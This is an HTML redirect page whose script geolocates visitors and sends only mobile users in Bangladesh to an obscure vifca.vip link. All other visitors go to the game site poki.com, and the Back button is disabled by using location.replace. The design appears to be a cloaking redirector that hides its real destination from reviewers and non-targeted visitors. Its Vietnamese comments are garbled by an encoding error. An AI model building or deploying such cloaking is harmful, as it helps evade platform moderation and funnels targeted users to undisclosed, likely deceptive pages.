<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Redirect...</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    /* ·∫®n m·ªçi th·ª©, tr√°nh ch·ªõp n·ªôi dung */
    html, body {
      margin: 0;
      padding: 0;
      width: 100%;
      height: 100%;
      overflow: hidden;
      background: #000; /* ƒë·ªïi #fff n·∫øu th√≠ch n·ªÅn tr·∫Øng */
    }
  </style>
</head>
<body>
  <script>
  (function () {
    // üîó LINK ƒê√É G·∫ÆN S·∫¥N
    const BD_URL    = "https://vifca.vip/zhvhg"; // Trang A: ch·ªâ cho BD + mobile
    const OTHER_URL = "https://poki.com";                      // Trang B: m·ªçi tr∆∞·ªùng h·ª£p c√≤n l·∫°i

    // ‚è± Th·ªùi gian delay (ms)
    const DELAY = 1000; // 1 gi√¢y (c√≥ th·ªÉ ƒë·ªïi 1500 / 2000)

    const CACHE_KEY = "geo_device_redirect_v1"; // key l∆∞u trong sessionStorage

    // H√†m check mobile / tablet
    function isMobileOrTablet() {
      var ua = navigator.userAgent || navigator.vendor || window.opera;
      var mobileRegex = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini|Windows Phone/i;
      return mobileRegex.test(ua);
    }

    function safeGetCache() {
      try {
        return sessionStorage.getItem(CACHE_KEY);
      } catch (e) {
        return null;
      }
    }

    function safeSetCache(value) {
      try {
        sessionStorage.setItem(CACHE_KEY, value);
      } catch (e) {
        // ignore
      }
    }

    // targetFlag: "A" (BD + mobile) ho·∫∑c "B" (c√°c tr∆∞·ªùng h·ª£p kh√°c)
    function go(targetFlag) {
      var url = (targetFlag === "A") ? BD_URL : OTHER_URL;

      // D√πng replace ƒë·ªÉ tr√°nh user b·∫•m Back quay l·∫°i trang check
      setTimeout(function () {
        window.location.replace(url);
      }, DELAY);
    }

    // 1Ô∏è‚É£ N·∫øu ƒë√£ c√≥ cache ‚Üí kh√¥ng g·ªçi API n·ªØa, redirect nhanh h∆°n
    var cached = safeGetCache();
    if (cached === "A" || cached === "B") {
      go(cached);
      return;
    }

    // 2Ô∏è‚É£ Ch∆∞a c√≥ cache ‚Üí g·ªçi API x√°c ƒë·ªãnh qu·ªëc gia
    fetch("https://ipapi.co/country/")
      .then(function (res) {
        return res.text();
      })
      .then(function (code) {
        code = (code || "").toString().trim().toUpperCase();

        var flag;
        // ‚úÖ CH·ªà KHI BD + MOBILE/TABLET M·ªöI V√ÄO TRANG A
        if (code === "BD" && isMobileOrTablet()) {
          flag = "A";   // BD + mobile ‚Üí Web A
        } else {
          flag = "B";   // c√≤n l·∫°i ‚Üí Web B
        }

        safeSetCache(flag);
        go(flag);
      })
      .catch(function () {
        // N·∫øu l·ªói API ‚Üí m·∫∑c ƒë·ªãnh cho sang B
        safeSetCache("B");
        go("B");
      });
  })();
  </script>
</body>
</html>
